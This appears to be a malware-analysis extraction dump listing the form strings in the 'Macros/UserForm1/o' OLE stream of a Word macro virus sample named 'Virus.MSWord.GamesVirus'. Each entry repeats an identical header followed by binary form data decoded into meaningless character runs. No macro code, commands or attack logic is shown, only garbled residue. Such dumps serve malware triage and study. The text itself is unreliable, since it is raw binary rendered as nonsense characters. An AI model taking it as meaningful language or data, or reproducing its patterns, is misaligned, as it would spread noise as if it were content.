VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1i"R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! #
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,!($! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 BiRRI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q$!Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I$!Q.1Q-)Q-)Q%)Q$!YCZalc0w{q]kq]ky.1A%)8-)I798.1I?9I%)A79Q8BI?9I61A.1(.1A8BQ8BI61Y8Ba.1a79a5)Y$!a0BQY��a��r��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
DcyQJ8MkyFs�3ZqW{�ek�Lc�X��W{�W{�W{��ƺH��i��Fs�r��>s�Fs�X��i��`��BRyUk�JRyh��q��X��!JYh��W{�;Zy<c�<c�Ek�Ns�Ns�Vs�Ns�Ek�W{�Vs�<cy3ZqMkqW{�W{�`��X��X��NsyMkqDcqVsyg{�Eky
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Y)I?9A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(AJI-)(?9A.10(Bq8B0AJAIJQ$! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q$!(-)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1YIJQ790-)0610610610
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%) 61(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w{�RRA[ZI1Jq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Q%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q61Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)Q%)YKZ�&1ICZ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I-)I$!I%)A%)A$!A%)A-)I8BI8BQ7980BI79A6188BI61Y8BQ79Y%)a%)Q-)Y$!aJRa/9IAJIJRQr��W{�W{�Vs�=k�Vs�>s�=k�ns�H��X��<c�Vs�BRQ���G{�P��`��W{�P��G{�G{�O{�Ns�g{�o{�Tc�EkyEky3Zi2Ri+Zi_{�_{�<cy4cy<c�<cyEk�W{�Ek�_{�_{�Ns�Ns�FsyW{�i��P��X��P��W{�X��P��z��_{�VsqVsy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$!($!(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)8JRA;Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I$!Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q&1a%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y$!Y%)Y.1Y79a!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I-)I%)Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I%)Q$!I%)I61Q.1Q8BQ.1A0BQ79YAJI$!(ekqAJQ-)Y%)a-)Y-)Y$!a8Ba8BYBRa9JQKZYKZQSZYX��=ky3ZqEk�O{�=k�W{�SZaKZYEkqFs�Y��H��W{�O{�P��a��Fs�G{�P��G{�O{�G{�G{�!Jq<cy=k�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)02Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9YVs�=kyNs�Ek�=k�Ek�Ns�X��i��Fs�`��Ns�Ns�X��W{�`��W{�a��i��`��a��`��r��P��Y��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $!(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q5k�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1i BY	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5) $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 $! #
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)Y%)a%)a%)Y61Y%)Y$!Y$!Y61Y-)Y$!a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I%)Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Q61Y%)Y79A.188BI9JI8BQJRYBRY8BY79Y-)a%)a%)Y%)Y%)YJRa8BYJRQSZaTcaSZYTca4cy)JaFs�+ZyKZi;ZqW{�<cqi��@��X��=k�X��a��Y�����r��=k�Vs�Fs�"Ri Ba*Ri2Rig{� BYX��Fs�P��Dc�Vs�<cyg{�Dc�W{�Ek�Ns�Ns�Ns�Ek�Ek�Dc�Fs�X��a��q��z��`��a��_{�_{�i��X��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1a)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y+Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)0&1A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)Y$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y.1a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Q%)a-)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q.1QBRY.18AJQ9JQ/9Q8Ba-)Y79Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)Y79i8BaAJa9JQSZYTcaekiKZYSZYAJISZYKZQ:Ra=kyNs�_{�P��O{�H��O{�G{�O{�P��i��O{�Y��)JaDcq!Ji*Ri*Ra)Ji*Ri Ba

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Ek�_{�Fs�G{�=k�Ek�2Ra=kyMkyq��Ns�<cya��Ek�<c�Ek�_{�Ns�X��NsyNsyW{�Ns�2Ri3ZiNs�`��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)($! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $!(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y5k�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4cy5k�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)I%)a%)Y%)Y-)a$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y$!Y%)Y%)a$!a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a.1i$!a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y$!Y%)Y$!I$!Y%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)Y%)Y%)Y%)Y79I79IAJQ/9Q-)a%)a-)a&1a%)a%)a-)a%)a-)a%)Y$!Y.1a.1YAJa\ca8BITcao{yJRQ\caSZYJRYh��Vs�Ns�j��X��_{�X��i��W{�Ek�r��H��)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y)Ja"RiEk� Ba!Ja3Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
03ZqO{�<c�Ek�Ns�5kyDcq^sq_{�Vs�;ZaMk�Ns�2RaW{�Ns�Ns�W{�Ek�h��z��2RaCZi<ciNs�MkqW{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! .1(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $!(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Q'9i#Zq)Q6s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y$!Y%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y$!a$!a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y8BI8BQ.1Y-)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a%)a%)Y%)Y%)Y79Y/9Q8BYTcaKZQKZY]kiJRQKZYTcaTcaNs�Mkq4c�W{�X��W{�a��Fs�G{�W{�O{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)JaW{�Fs�;Zq;Zi2Rq+Zq*RaEk�Ns�G{�Fs�3Zq'9Q;ZaLci`��)JQ_{�_{�*RaNs�Mk�Fs�Ek�W{�W{�)JQMkyMkyW{�;Zi;Za
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! %) #
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)a&1a%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y$!a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a$!a$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a%)a.1a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a$!a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y&1i%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y79a.1Y8BYKZY79Q61QSZYKZYekiw{y\caTcYO{�O{�Ns�Y��q��q��Ns�Ns�G{�a��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!8)Ja2Ri3Zq BQ:Ra2RYDciNs�4cy)JiFs�Vs�W{�W{�Vs�Fs�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1ACZao{�h��_{�Vs�;ZY;Za<cy<cq=ky<cq=kyq��MkyEkyW{�W{�;Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 $! $! -)0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.10%)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)a%)a&1a%)a%)a%)a%)a%)a%)a%)a%)a%)a%)a%)a-)a$!a%)a%)a$!a%)Y$!Y%)a%)Y%)a%)a&1a%)a&1i%)a%)a-)a%)a%)a%)a%)a%)a%)a$!Y%)a%)a%)Y%)a%)a$!a%)a&1a.1i.1a.1Q8BY?9ASZYdciSZY]kqfsqKZYMkq:RYa��X��W{�X��Y��4cy`��Fs�_{�<cyEky2RY_{�Mki2Ri=k�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9IEk�Vs�W{�G{�Ns�_{�`��_{�Mk� BQNsyg{�VsyMk�Nsy2Ra4ciMky=kq<cqVs�Mk�`��`��h��Ns�Nsy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a%)a%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a%)a%)Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
